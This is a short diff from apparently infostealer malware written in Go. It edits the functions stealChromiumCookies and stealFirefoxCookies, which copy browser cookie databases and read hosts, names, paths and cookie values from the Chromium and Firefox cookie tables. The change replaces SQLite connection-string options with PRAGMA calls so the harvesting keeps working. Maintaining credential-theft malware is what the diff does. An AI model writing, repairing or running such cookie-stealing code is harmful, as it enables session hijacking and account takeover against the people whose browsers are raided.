@@ -83,10 +83,12 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite", tmpPath+"?mode=ro&_journal=WAL&_busy_timeout=3000")
+		db, err := sql.Open("sqlite", tmpPath)
 		if err != nil {
 			continue
 		}
+		db.Exec("PRAGMA busy_timeout = 3000")
+		db.Exec("PRAGMA journal_mode = WAL")
 
 		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 		if err != nil {
@@ -139,10 +141,12 @@ func stealFirefoxCookies(profilesPath string) string {
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite", tmpPath+"?mode=ro&_busy_timeout=3000")
+		db, err := sql.Open("sqlite", tmpPath)
 		if err != nil {
 			continue
 		}
+		db.Exec("PRAGMA busy_timeout = 3000")
+		db.Exec("PRAGMA journal_mode = WAL")
 
 		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
 		if err != nil {
